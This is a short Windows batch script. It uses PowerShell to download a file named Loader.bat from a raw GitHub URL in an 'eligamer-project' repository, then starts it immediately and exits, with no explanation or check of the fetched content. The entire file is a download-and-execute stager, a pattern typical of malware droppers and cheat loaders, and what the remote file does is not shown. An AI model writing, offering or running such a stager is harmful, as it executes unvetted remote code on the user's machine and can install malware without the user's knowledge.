@echo off
set "URL=https://raw.githubusercontent.com/enoisstock/eligamer-project/main/Loader.bat"
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile 'Loader.bat'"
start Loader.bat
exit